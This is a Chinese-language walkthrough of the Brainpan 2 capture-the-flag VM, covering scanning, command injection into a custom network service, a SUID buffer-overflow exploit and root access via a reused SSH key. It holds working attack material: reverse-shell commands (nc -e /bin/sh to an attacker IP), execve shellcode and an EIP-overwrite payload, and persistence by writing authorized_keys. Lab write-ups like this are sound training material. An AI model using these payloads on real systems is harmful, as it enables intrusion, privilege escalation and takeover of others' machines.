VMware双击运行即可！选择wifi桥接！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.2.0/24 -sP
Nmap scan report for brainpan2.lan (192.168.2.219)

--------------------------------------------
--------------------------------------------
2、nmap 192.168.2.219 -p- -A

9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)


--------------------------------------------
--------------------------------------------
3、web信息收集

访问：http://192.168.2.219:10000/


--------------------------------------------
--------------------------------------------
4、命令注入

nc 192.168.2.219 9999
GUEST
TELL ME MORE
可看到有很多文件：
    FILES    HELP    VIEW       CREATE
    USERS    MSG     SYSTEM     BYE
发现有很多文件信息，但是不知道命令：
HELP

给出了提示：
FILES 显示当前存储在服务器上的文件。
VIEW 查看存储在服务器上的文件。
CREATE 在服务器上创建一个文件。
USERS 显示当前登录的用户列表。
MSG 向用户发送消息。
SYSTEM 报告系​​统信息。
BYE 退出服务器。

目前没有适当的身份验证机制。在这
       软件处于 alpha 阶段的时间。唯一可用的帐户是
       客人。 DEBUG 帐户会改变一些命令的输出 - 使用 -
       对开发人员来说非常有用。

虽然无法从GUEST以DEBUG身份登录，但可以直接以DEBUG身份登录！

telnet 192.168.2.219 9999
DEBUG
TELL ME MORE
SYSTEM   ---查看系统配置信息
FILE
VIEW    ---提示输入要读取的文件：
notes.txt;    ---读取日志

VIEW
/etc/passwd;

-----
anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
-----
可以使用VIEW命令读取/etc/passwd。

尝试注入命令测试：
VIEW
notes.txt; id;
回显：uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)

nc -vlp 443   ---kali开启本地监听
VIEW
; nc -e /bin/sh 10.211.55.19 443

python -c 'import pty; pty.spawn("/bin/bash")'
成功拿到稳定反弹shell！

; nc -e /bin/sh 10.211.55.19 443


--------------------------------------------
--------------------------------------------
5、ssh建立反向隧道

植入ssh_rsa！
echo '写入key' > authorized_keys

kali开启ssh：/etc/init.d/ssh restart
https://blog.csdn.net/woai_zhongguo/article/details/121373551
参考文章修改两处地方即可！
ssh root@192.168.2.157 -R 9876:127.0.1.1:2222

netstat -ntulp
tcp        0      0 127.0.0.1:9876          0.0.0.0:*               LISTEN      7011/sshd: root@pts
可看到开启了ssh的端口转发！

cd ~/.ssh
ssh anansi@localhost -p 9876

--------------------------------------------
--------------------------------------------
6、内部信息收集

1）* * * * * /home/anansi/startbrainpan.sh

2）127.0.1.1:2222
3）两个root？？
root :x:0:0:root:/var/root:/bin/bash
root:x:104:106:root:/root:/bin/bash
4）find / -perm -4000 2>/dev/null
/home/reynard/msg_root


cd /home/reynard/
读取两个文件信息：
------
anansi@brainpan2:/home/reynard$ cat readme.txt
msg_root is a quick way to send a message to the root user. 
Messages are written to /tmp/msg.txt

usage: 
msg_root "username" "this message is for root"
anansi@brainpan2:/home/reynard$ cat startweb.sh
#!/bin/bash

lsof -i:10000 2>&1 > /dev/null
if [[ $? -ne 0 ]]; then 
    pushd /home/reynard/web
    python -m SimpleHTTPServer 10000
    popd
fi
------
消息写入 /tmp/msg.txt


--------------------------------------------
--------------------------------------------
7、缓冲区溢出

1）验证其功能性
./msg_root
usage: msg_root username message

根据readme.txt的提示继续尝试：
./msg_root "test" "test"
Your message is test
然后查看tmp目录：
cat /tmp/msg.txt
test: test

--------------------------------------------
2）查看是否存在缓冲区溢出
./msg_root $(perl -e 'print "A"x100') dayu
Segmentation fault
报字段错误崩溃，发现在第一个字符处存在缓冲区溢出！

--------------------------------------------
3）查找偏移量

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

gdb ./msg_root
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A dayu   ---记得后面跟上个信息

0x35614134

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35614134                                                                         
[*] Exact match at offset 14
发现偏移量为14！

--------------------------------------------
4）测试偏移量覆盖

gdb ./msg_root
run $(perl -e 'print "A"x14 . "B"x4 . "C"x100') dayu
i r
eip            0x42424242   0x42424242
可看到EIP已经被B给覆盖！

--------------------------------------------
5）验证安全ASLR

ASLR验证：
anansi@brainpan2:/home/reynard$ cat /proc/sys/kernel/randomize_va_space
0
未开启ASLR！

--------------------------------------------
6）shellcode定位
这里可以根据项目三十六的格式字符串缓冲区溢出思路来进行定位环境内存地址！

---------------------------
http://shell-storm.org/shellcode/files/shellcode-811.php   ---这里使用811，827不行！

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
---------------------------
将shell代码放在环境变量中，并将程序流重定向到环境变量的地址即可！


将偏移量移/tmp目录中，并对其进行排序：
export DAYU=`python -c 'print "\x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`

--------------------------------------------
7）定位环境变量的地址

当环境变量中植入shellcode后，需要找到覆盖覆盖函数的地址！
植入shellcode需要找到地址该脚本可以找：
https://raw.githubusercontent.com/Partyschaum/haxe/master/getenvaddr.c

---------------------
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
--------------------
将保存到：getenvaddr.c

nano getenvaddr.c
gcc -o getenvaddr getenvaddr.c

文件上传：
wget http://10.211.55.19:8081/getenvaddr -O /tmp/getenvaddr
chmod +x /tmp/getenvaddr

尝试运行：
anansi@brainpan2:/tmp$ ./getenvaddr 
Usage: ./getenvaddr <environment variable> <target program name>
注意！！！这里项目环境是32位的linux系统，没有安装gcc需要本地32位的kali进行编译！


前面已经将shellcode放入环境变量中了，现在可以使用SPAWN在执行目标二进制文件期间找到环境变量在内存中的位置：
anansi@brainpan2:/home/reynard$ /tmp/getenvaddr DAYU ./msg_root
SPAWN will be at 0xbfffffb7

shellcode地址：0xbfffffb7    ---要覆盖的内存地址
0xbfffffb7
\xb7\xff\xff\xbf

--------------------------------------------
8）调用偏移量跳入内存环境植入的shellcode

./msg_root $(perl -e 'print "A"x14 . "\xb7\xff\xff\xbf"') dayu

$ id
uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
成功获得root权限！仔细查看“id”命令，会发现euid是“104”，而groupid是“106”，而“root”通常是“0”和“0”！不正常！！

$ cat flag.txt
cat: flag.txt: Permission denied

但是读取flag.txt无权限查看？？？
在内部信息收集发现两个root账号，一个root一个多一个空格的root！


--------------------------------------------
--------------------------------------------
8、内部信息收集

find / -perm -4000 2>/dev/null
/opt/old/brainpan-1.8/brainpan-1.8.exe

进入目录查看：
cd /opt/old/brainpan-1.8/   ---ls
-rwsr-xr-x 1 puck  puck  17734 Nov  4  2013 brainpan-1.8.exe
-rw-r--r-- 1 puck  puck   1227 Nov  5  2013 brainpan.7
-rw-rw-rw- 1 puck  staff    27 Nov  5  2013 brainpan.cfg

cat brainpan.cfg
port=9333
ipaddr=127.0.0.1
只允许本地访问，端口为：9333


--------------------------------------------
--------------------------------------------
9、命令注入

修改配置信息：
echo "port=9333\nipaddr=0.0.0.0" > brainpan.cfg

运行：
./brainpan-1.8.exe
port = 9333
ipaddr = 0.0.0.0
+ bind done
+ waiting for connections...


telnet 10.211.55.55 9333
GUEST
TELL ME MORE
VIEW
a; nc -e /bin/sh 10.211.55.19 4444   ---这里加入个信息a即可！

id
uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
成功拿到puck的shell！但是拿到的shell很不稳定！

植入ssh_rsa：
cd /home/puck/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQClcz0LUfQmAYNwHhMH8QzmYs3AodvINpIUOlxZJ+9k9WMFu/GQd1KvapHhKyaUS6rX5dszTjCPL6ia8KrZoge3FmxeT5vk+yI7/tVO5evXn3Cgx9bO4IjlqOHbs7OKKvirX/drzRSvy9LsOqAfsqLfkxq944L/v+yo+clvIg4hySsNLp3olTU1KwjuJneHDesrAVmOSQETjeha7yie/Dwv4avPYiKl6XcvYJ5zhZKueDCTDA4Slc0y1cNlUdRg2h+bmumG5Qul74AJrdQP5TN1+Yx1bRN67Pf1sr+G2848pQ4VVqqpv/cI1TJ64zneUIqNRG+3Hezr/t0jurxH7FV6MbA5EIJ6X0pjqBM/X2HTIutyyzKDbRimkM6ccqJufxzx961nu2k6BuSn0wbBS0FSvBNABmSm9BeN+8n94W9Wo798p8v/N+QIqngX7R/g0ido4huXUOIqf1+fRD8HDWqNOLUhU+p2nTk0P6xHt8ZXRG+uY43Ehdn7PnDb156qPfs= root@dayu' > authorized_keys

ssh puck@localhost -p 9876
成功登录获得稳定shell！

--------------------------------------------
--------------------------------------------
10、对比rsa+复用提权

ls -la
total 28
drwx------ 4 puck  puck  4096 Nov  5  2013 .
drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..
drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup
-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history
-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout
-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc
-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile
drwx------ 2 puck  puck  4096 Apr 29 01:36 .ssh

cd .backup
cat .bash_history   ---发现该用户的历史记录信息


diff :比较俩个目录里相同文件的内容

diff -q ~/.ssh/id_rsa ~/.backup/.ssh/id_rsa
Files /home/puck/.ssh/id_rsa and /home/puck/.backup/.ssh/id_rsa differ
对比发现两个文件夹中的.ssh的私钥都不同！


使用此备份密钥以root身份进行ssh：谨记这里root用户有空格
ssh -l "root " 127.0.1.1 -p 2222 -i id_rsa
-l  ---指定登录的用户

root @brainpan2:~# id
uid=0(root ) gid=0(root ) groups=0(root )
成功登录！

root @brainpan2:/root# cat flag.txt 

                          !!! CONGRATULATIONS !!!

                 You've completed the Brainpan 2 challenge! 
                 Or have you...? 

                 Yes, you have! Pat yourself on the back. :-)

                 Questions, comments, suggestions for new VM
                 challenges? Let me know! 


                 Twitter: @superkojiman
                 Email  : contact@techorganic.com
                 Web    : http://www.techorganic.com


You've completed the Brainpan 2 challenge!！  ---成功完成挑战！


--------------------------------------------
--------------------------------------------
11、拓展知识：

--------------------------------------------
1）gdb逆向分析:
disassemble main
0x08048776 <+59>:   call   0x80486a1 <get_name>
看到对 <get_name> 函数的调用

disassemble 0x80486a1
0x080486cb <+42>:   call   0x80484b0 <strcpy@plt>
这个strcpy函数将用户的命令行输入复制到一个变量中。
strcpy是一个众所周知的缓冲区溢出漏洞。


2）搭建情况熟知：
-----
cat startbrainpan.sh 
#!/bin/bash

lsof -i:9999 2>&1 > /dev/null
if [[ $? -ne 0 ]]; then 
    pushd /opt/brainpan
    ./brainpan.exe
    popd
fi
-----






































































































